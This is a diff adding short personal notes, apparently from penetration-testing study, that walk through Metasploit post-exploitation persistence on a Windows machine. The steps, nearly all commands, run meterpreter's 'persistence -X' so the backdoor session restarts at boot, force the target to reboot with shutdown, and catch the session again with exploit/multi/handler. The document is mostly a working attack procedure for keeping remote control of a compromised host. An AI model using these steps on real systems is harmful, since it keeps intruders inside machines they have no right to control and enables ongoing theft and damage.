@@ -1,0 +1,18 @@
+1) after escalating permissions
+
+
+2) meterpreter> run persistence -h           // give options about persistence
+
+3) meterpreter> run persistence -X           //now the meterpreter sessions starts itself after reboot
+
+4) move to c:\> 
+   
+     C:\> shutdown /r                       //reboots after 1 minute
+     C:\> shutdown /r /t 0                 //reboots suddenly
+
+5) previous sessions will be closed::::
+ 
+    msf exploit(ask) > use exploit/multi/handler
+    msf exploit(ask) > exploit 
+
+6) sometimes when we give reboot command we have to move to other sessions 
